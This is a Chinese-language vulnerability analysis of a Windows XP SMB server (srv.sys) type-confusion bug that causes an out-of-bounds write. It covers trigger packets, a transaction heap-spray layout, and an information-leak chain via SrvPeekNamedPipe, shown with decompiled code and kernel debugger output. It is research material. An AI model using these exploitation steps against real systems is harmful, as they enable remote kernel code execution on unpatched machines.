@@ -1,0 +1,226 @@
+            SrvDereferenceTransaction(pTrans_);
+            _SrvSetSmbError2(v1, 0x80000005, 0, 3238, (int)"d:\xpsp\base\fs\srv\smbrdwrt.c");
+            StatusCode = 0x80000005;
+            goto LABEL_100;
+          }
+          v31 = Size;
+          qmemcpy((void *)pTrans->DataBuffer, VirtualAddress, Size);
+          //
+          // ！！！！这里将DataBuffer指针给增加了！！！！
+          //
+          pTrans_->DataBuffer += Size;
+          pTrans_->nTransDataCounts += v31;
+        ...略
+    }
+看到pTrans_-&gt;DataBuffer +=
+Size这句相信大家就能明白了。这里将DataBuffer的指针增大了。再处理此Transcation的SMB_COM_TRANSACTION_SECONDARY命令的时候也就是SrvSmbTransactionSecondary中复制Data的memcpy可就越界了！！！！！
+所以此漏洞可以总结成类型混淆造成的越界写。
+**4.3 Exploit数据包**
+通过对Exploit抓包我们可以看到其漏洞触发过程。
+首先发送SMB_COM_TRANSACTION命令创建一个TID=2049 PID=0 UID=2049
+MID=16385(0x4001)的Transcation：
+然后发送SMB_CMD_WRITE_ANDX命令还增加pTrans_-&gt;DataBuffer这个指针：
+**  
+**
+**5 漏洞利用**
+从上面描述可以看出，该漏洞为类型混淆导致的越界写漏洞。前期通过spray
+使多个TRANSACTION相邻，然后让其中一个TRANSACTION触发该漏洞，再通过该TRANSACTION越界写其相邻的TRANSACTION
+spary 最终 memory view:
+spray的目的是构造出下出三个相邻的transaction, 其中write_transaction 主要用于写操作，leak_transaction
+主要用于信息泄露，而control_transaction为触发漏洞的transaction,触发之后其他InData字段会增加0x200,
+以致于可写的范围可以向后延伸0x200.利用于这点可以写与其相依的write_transaction的InData字段。从面达到任意地址写的效果。
+注: 本次调试中 control_transaction地址为：0x58b90, write_transaction地址为: 0x59c38,
+leak_transaction地址为:0x5ace0
+其中TRANSACTION 结构部份如下：
+    typedef struct _TRANSACTION {
+        //...
+        /*+0xc*/     LPVOID Connection;
+        //...
+        /*+0x34*/    LPWORD InSetup;
+        //...
+        /*+0x40*/    LPBYTE OutParameters;
+        /*+0x44*/    LPBYTE InData; /*写的目的地址*/
+        /*+0x48*/   LPBYTE OutData; /*读的目的地址*/
+        //...
+        /*+0x60*/   DWORD DataCount; /*控制可读的长度*/
+        /*+0x64*/   DWORD TotalDataCount
+        }TRANSACTION
+写操作：
+    SMB_PROCESSOR_RETURN_TYPE SrvSmbTransactionSecondary (
+        SMB_PROCESSOR_PARAMETERS
+        )
+    {
+        //...
+        request = (PREQ_TRANSACTION_SECONDARY)WorkContext->RequestParameters;
+        header = WorkContext->RequestHeader;
+        transaction = SrvFindTransaction( connection, header, 0 );
+        //...
+        dataOffset = SmbGetUshort( &request->DataOffset );
+        dataCount = SmbGetUshort( &request->DataCount );
+        dataDisplacement = SmbGetUshort( &request->DataDisplacement );
+        //...
+        // Copy the parameter and data bytes that arrived in this SMB.
+        //...
+        if ( dataCount != 0 ) {
+            RtlMoveMemory(
+                transaction->InData + dataDisplacement,
+                (PCHAR)header + dataOffset,
+                dataCount);
+        }
+        //...
+    }
+读操作：
+    VOID SrvCompleteExecuteTransaction (
+        IN OUT PWORK_CONTEXT WorkContext,
+        IN SMB_TRANS_STATUS ResultStatus)
+    {
+        //...
+        transaction = WorkContext->Parameters.Transaction;
+        header = WorkContext->ResponseHeader;
+        transactionCommand = (UCHAR)SmbGetUshort( &transaction->InSetup[0] );
+        //...
+            // Copy the appropriate parameter and data bytes into the message.
+            if ( paramLength != 0 ) {
+                RtlMoveMemory( paramPtr, transaction->OutParameters, paramLength );
+            }
+            if ( dataLength != 0 ) {
+                RtlMoveMemory( dataPtr, transaction->OutData, dataLength );
+            }
+        //...
+    }
+从exp运行的log可以看出该漏洞利用分为两部份：信息泄露 与 代码执行
+**5.1 信息泄露**
+需要泄露的信息包括 Transaction2Dispatch Table基址 与 一块NonePagedPool Buffer地址.
+通过修改Transaction2Dispatch Table中的函数指针来执行 shellcode， 其中NonePagedPool
+Buffer就是用于存放shellcode.
+**5.1.1 泄露Transaction2Dispatch Table基址**
+从exp运行的log可以看出首先泄露CONNECTION结构基址：CONNECTION地址存放于TRANSACTION-&gt;Connection字段。看到这，你可能已经想到该怎么做了：直接利用constrol
+transaction的0x200字节的越界能力修改write_transaction的DataCount字段让其可以越界读leak_transaction上的内容，从而读出TRANSACTION-&gt;Connection。
+但exp作者却并没有这么做，这里并不打算深究其原因，或许是有其他限制，或许不是。
+作者这里利用了另一种复杂不少方法，通过另一种方法修改 write_transaction的DataCount字段。
+**5.1.1.1 write_transaction初始状态如下:**
+可以看出CONNECTION地址为：89a29c18，OutData为0x5acd4 (==
+59c38+0x109c)已经是write_transaction的末尾，所以其DataCount为0,表示不可读。
+**5.1.1.2 修改write_transaction- >DataCount**
+首先
+修改write_transaction的InSetup为0x23，这点通过control_transaction很容易完成。之后发包触发写write_transaction操作，会走到：
+    SMB_STATUS SRVFASTCALL ExecuteTransaction (
+        IN OUT PWORK_CONTEXT WorkContext)
+    {
+        //...
+        transaction = WorkContext->Parameters.Transaction;
+        //...
+                command = SmbGetUshort(&transaction->InSetup[0]);
+                //...
+                switch( command ) {
+                case TRANS_TRANSACT_NMPIPE:
+                    resultStatus = SrvTransactNamedPipe( WorkContext );
+                    break;
+                case TRANS_PEEK_NMPIPE: //0x23
+                    resultStatus = SrvPeekNamedPipe( WorkContext );
+                    break;
+                case TRANS_CALL_NMPIPE:
+                    resultStatus = SrvCallNamedPipe( WorkContext );
+                    break;
+                //...
+            }
+            //...
+    }
+由于之前已经将write_transaction的InSetup修改为0x23, 所以会call SrvPeekNamedPipe。
+    # ChildEBP RetAddr               
+    00 b21f8d44 b24cdcce srv!ExecuteTransaction+0x23b (FPO: [0,0,0])
+    01 b21f8d7c b248a836 srv!SrvSmbTransactionSecondary+0x2f1 (FPO: [Non-Fpo])
+    02 b21f8d88 b249ad98 srv!SrvProcessSmb+0xb7 (FPO: [0,0,0])
+    03 b21f8dac 805c7160 srv!WorkerThread+0x11e (FPO: [Non-Fpo])
+    04 b21f8ddc 80542dd2 nt!PspSystemThreadStartup+0x34 (FPO: [Non-Fpo])
+    05 00000000 00000000 nt!KiThreadStartup+0x16
+    SrvPeekNamedPipe() 调用IoCallDriver最终调到 RestartPeekNamedPipe()函数 
+    VOID SRVFASTCALL RestartPeekNamedPipe (
+        IN OUT PWORK_CONTEXT WorkContext)
+    {
+        //...
+        //
+        // Success.  Generate and send the response.
+        //
+        transaction = WorkContext->Parameters.Transaction;
+        pipePeekBuffer = (PFILE_PIPE_PEEK_BUFFER)transaction->OutParameters;
+        readDataAvailable = (USHORT)pipePeekBuffer->ReadDataAvailable;
+        messageLength = (USHORT)pipePeekBuffer->MessageLength;
+        namedPipeState = (USHORT)pipePeekBuffer->NamedPipeState;
+        //
+        // ... then copy them back in the new format.
+        //
+        respPeekNmPipe = (PRESP_PEEK_NMPIPE)pipePeekBuffer;
+        SmbPutAlignedUshort(
+            &respPeekNmPipe->ReadDataAvailable,
+            readDataAvailable
+            );
+        SmbPutAlignedUshort(
+            &respPeekNmPipe->MessageLength,
+            messageLength
+            );
+        SmbPutAlignedUshort(
+            &respPeekNmPipe->NamedPipeState,
+            namedPipeState
+            );
+        //
+        // Send the response.  Set the output counts.
+        //
+        // NT return to us 4 ULONGS of parameter bytes, followed by data.
+        // We return to the client 6 parameter bytes.
+        //
+        transaction->SetupCount = 0;
+        transaction->ParameterCount = 6;
+        transaction->DataCount = WorkContext->Irp->IoStatus.Information - (4 * sizeof(ULONG));
+        //...
+    }
+该函数最终会修改Transaction-&gt;DataCount 为 0x23c。
+    kd> ub
+    srv!RestartPeekNamedPipe+0x42:
+    b7700137 66895004        mov     word ptr [eax+4],dx
+    b770013b 83614c00        and     dword ptr [ecx+4Ch],0
+    b770013f c7415406000000  mov     dword ptr [ecx+54h],6
+    b7700146 8b4678          mov     eax,dword ptr [esi+78h]
+    b7700149 8b401c          mov     eax,dword ptr [eax+1Ch]
+    b770014c 83e810          sub     eax,10h
+    b770014f 85ff            test    edi,edi
+    b7700151 894160          mov     dword ptr [ecx+60h],eax
+    kd> ?ecx+0x60
+    Evaluate expression: 367768 = 00059c98
+    kd> r eax
+    eax=0000023c
+    kd> dd 00059c38
+    00059c38  109c020c 00000000 ffdff500 89a29c18
+    00059c48  e1ed9900 e15e2960 0005acf8 00058ba8
+    00059c58  00020000 00059cd0 00002307 00000001
+    00059c68  00000000 00059cd4 8993b3e5 00059cd4
+    00059c78  00059d14 ffdff500 0005acd4 00000000
+    00059c88  00000000 00000006 00000000 00000ff0
+    00059c98  0000023c 00000000 00000001 00000000
+    00059ca8  00000101 08000000 0800cee6 00000000
+    kd> k
+     # ChildEBP RetAddr  
+    00 b7c0ed88 b76dad98 srv!RestartPeekNamedPipe+0x5f
+    01 b7c0edac 805c6160 srv!WorkerThread+0x11e
+    02 b7c0eddc 80541dd2 nt!PspSystemThreadStartup+0x34
+    03 00000000 00000000 nt!KiThreadStartup+0x16
+至此，已经成功修改了write_transaction的DataCount值，之后便可以越界读出
+leak_transacion-&gt;Connection值: 89a29c18。
+**5.1.1.3 SRV global data pointer**
+    kd> dds 89a29c18
+    89a29c18  02580202
+    89a29c1c  0000001d
+    89a29c20  00000000
+    89a29c24  00000000
+    89a29c28  00000000
+    89a29c2c  00000000
+    89a29c30  00000000
+    89a29c34  00000000
+    89a29c38  00000000
+    89a29c3c  b76d8bec srv!SrvGlobalSpinLocks+0x3c
+    89a29c40  899d0020
+    89a29c44  000005b3
+    89a29c48  8976c200
+    89a29c4c  00004000
+    89a29c50  10000100
+    89a29c54  00000000
